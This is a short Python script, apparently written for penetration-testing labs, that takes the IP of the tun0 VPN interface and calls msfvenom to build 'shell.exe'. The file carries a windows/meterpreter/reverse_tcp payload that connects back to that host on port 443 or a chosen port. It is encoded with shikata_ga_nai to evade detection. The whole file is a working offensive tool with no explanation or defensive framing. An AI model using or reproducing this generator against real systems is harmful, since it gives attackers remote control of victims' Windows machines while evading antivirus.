#!/usr/bin/env python
# encoding: utf-8

import netifaces as ni
import subprocess
import sys

def get_ip_address():
    ni.ifaddresses("tun0")
    ip = ni.ifaddresses("tun0")[ni.AF_INET][0]["addr"]
    return(ip)

def generate_shell_code(payload, ip, port):    
    temp = subprocess.Popen(["msfvenom", "-p", payload , "-f", "exe", "-o", "shell.exe", "LHOST={}".format(ip), "LPORT={}".format(port), "-e", "x86/shikata_ga_nai"], stdout = subprocess.PIPE) 
    output = str(temp.communicate())     
    return(output)
    
def main():
    port = 443 
    tun0 = get_ip_address()    
    payload = "windows/meterpreter/reverse_tcp"
    if (len(sys.argv) > 1):
        port= sys.argv[1]        
   
    output = generate_shell_code(payload, tun0, port)    
    print("Finished with payload {} on port {}".format(payload, port))


if __name__ == "__main__":
    main()
